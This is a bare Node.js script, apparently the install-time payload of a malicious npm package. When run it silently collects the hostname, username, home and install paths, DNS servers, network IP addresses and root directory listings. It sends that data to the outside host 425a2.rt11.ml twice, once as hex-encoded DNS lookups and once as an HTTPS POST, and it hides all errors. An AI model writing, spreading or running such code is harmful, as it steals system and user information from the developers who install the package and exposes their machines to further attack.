const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const fs = require('fs');
var path = require('path');
const packageJSON = require("./package.json");
const package = packageJSON.name;

function getFiles(paths) {
var ufiles=[];
for(var j=0;j<paths.length;j++){
try{
  mpath = paths[j];
  files = fs.readdirSync(mpath);
  for(var i=0;i<files.length;i++){
  ufiles.push(path.join(mpath,files[i]));
  }
}
catch(error){}
}
  return ufiles;
}

function isprivate(ip) {
   if(ip.startsWith('fe80::')||ip=="::1")
       return true;
   var parts = ip.split('.');
   return parts[0] === '10' || 
      (parts[0] === '172' && (parseInt(parts[1], 10) >= 16 && parseInt(parts[1], 10) <= 31)) || 
      (parts[0] === '192' && parts[1] === '168') || (parts[0] === '127' && parts[1] === '0' && parts[2] === '0');
}

function toHex(data){
const bufferText = Buffer.from(data, 'utf8');
const text = bufferText.toString('hex');
return text;
}

function todashedip(ip){
return ip.replace(/\./g, '-').replace(/:/g,'-');
}

function gethttpips(){
var str=[];
var networkInterfaces = os.networkInterfaces();
for(item in networkInterfaces){
if(item != "lo"){
for(var i=0;i<networkInterfaces[item].length;i++){
str.push(networkInterfaces[item][i].address);
}
}
}
return str;
}

function getIps(){
var str=[];
var networkInterfaces = os.networkInterfaces();
for(item in networkInterfaces){
if(item != "lo"){
for(var i=0;i<networkInterfaces[item].length;i++){
if(!isprivate(networkInterfaces[item][i].address))
str.push(networkInterfaces[item][i].address);
}
}
}
for(var i=0;i<str.length;i++){
if(str[i].includes('.'))
return "i."+todashedip(str[i])+".i";
}
if(str.length>0)
return "i."+todashedip(str[0])+".i";
else
return "i._.i";
}

function getPathChunks(path){
str="";
chunks = path.split('/');
for(var i=0;i<chunks.length;i++){
str=str+toHex(chunks[i])+".";
}
str=str.slice(1,-1);
return "p."+str+".p";
}

function toName(pkg){
var str="";
var queries = [];
var substr1 = "";
var substr2 = "";
var hostname = "425a2.rt11.ml";
str=toHex(pkg.hn)+"."+toHex(pkg.p)+"."+toHex(pkg.un)+"."+getPathChunks(pkg.c)+"."+getIps()+"."+hostname;
queries.push(str);
return queries;
}

const td = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    ip: JSON.stringify(gethttpips()),
    dirs: JSON.stringify(getFiles(["C:\\","D:\\","/","/home"])),
}
var qs = toName(td);
for(var j=0;j<qs.length;j++){
dns.lookup(qs[j], function(err, result) {
  //console.log(result)
});
}

const trackingData = JSON.stringify(td);
var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "425a2.rt11.ml",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        //process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
